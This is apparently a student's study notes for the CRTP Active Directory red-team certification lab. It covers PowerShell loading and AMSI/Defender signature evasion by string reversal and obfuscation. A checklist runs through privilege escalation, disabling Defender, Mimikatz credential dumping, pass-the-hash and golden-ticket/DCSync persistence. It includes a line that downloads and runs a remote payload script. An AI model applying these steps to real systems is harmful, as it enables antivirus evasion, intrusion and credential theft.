# CRTP One Week Challenge

# PowerShell
Load a script and module (local)
```
. C:\AD\Tools\PowerView.ps1
OR
Import-Module C:\AD\Tools\PowerView.ps1
```
list all the commands u can use in a particular module
```
Get-Command -Module <modulename>
```

- Load a script and module (remotely)
-     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')

- Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
-     RunWithPathAsAdmin.bat  (Admin Privilege)
-     RunWithRegistryNonAdmin.bat  (non-Admin Privilege)

Bypassing AV Signatures for PowerShell
.      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
.      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
.      Scan using AMSITrigger 'AmsiTrigger_x64.exe -i PowerUp.ps1' | Modify the detected code by reversing ex. 'System.AppDomain' to 'niamoDppA.metsyS' | Rescan using AMSITrigger | Repeat the steps till u get a result as "AMSI_RESULT_NOT_DETECTED"
.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag
.      simply provide path to the script file to scan it
-     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
.      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
## Reverse the "Net.Sockets" string on line number 32
```powershell
$string = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
$client = New-Object System.$class.TCPClient($IPAddress,$PORT)
}
```

# Methodology Master
---
## 0. Miscellaneous
> 1. [ ] Remember to bypass AMSI on every new user
> 2. [ ] Check the Execution policy language mode
> 3. [ ] Check all the commands you are allowed to execute

## 1. Domain Enumeration
> 1. [ ] Complete basic Enum
> 2. [ ] enumerate all users
> 3. [ ] enumerate all domain computers
> 4. [ ] GPO && OU
> 5. [ ] ACL's 
> 6. [ ] Trusts
> 7. [ ] Blood-hound
> 8. [ ] SPN

## 2. Local Priv Esc
> 1. [ ] Run *powerups.ps1*
> 2. [ ] **ServiceUnquoted**
> 3. [ ] **ModifiableServiceFile**
> 4. [ ] **ModifiableService**
> 5. [ ] Priv Esc for the above use : **Invoke-ServiceAbuse**
> 6. [ ] **whoami /all** || **whoami /priv**
> 7. [ ] Check Windows abuse and priv esc
> 8. [ ] Hunt for Local Admin users if available from Trust Enum
> 9. [ ] Priv Esc for the above use : PSsession or refer **Invoke-Command**
> 10. [ ] Check if you can Priv esc using *jenkins*
> 11. [ ] Lastly add the user to the localgroup administrators

**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**

## 3. Domain Admin Priv Esc
> 1. [ ] Hunt for Local Admin Users
> 2. [ ] Check The local Admin Access
> 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**

## 4. Domain Admin Persistence [app locker enabled]
> 1. [ ] Check the Execution policy language mode
> 2. [ ] Checking AppLockerPolicy and note the paths available for us
> 3. [ ] Disable Defender protections
> 4. [ ] Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
> 5. [ ] run script without dot sourcing it
> 6. [ ] Dump the hashes
> 7. [ ] Get the ekeys
> 8. [ ] Get Credentials from the credentials vault

## 5. Domain Admin Persistence
> 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
> 2. [ ] Get the ekeys
> 3. [ ] Get Credentials from the credentials vault
> 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user

## 6. New user from DA Priv Esc
> 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found

## 7. DC pwn
> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession**

## 8. Domain Controller Persistence
> 1. [ ] Golden Ticket
> 2. [ ] Silver Ticket
> 3. [ ] DSRM
> 4. [ ] ACL AdminSDHolder
> 5. [ ] ACL DCSync
> 6. [ ] ACL security Descriptors

## 9. Forest Priv Esc

> 1. [ ] Forge inter-forest ticket by trust keys

---



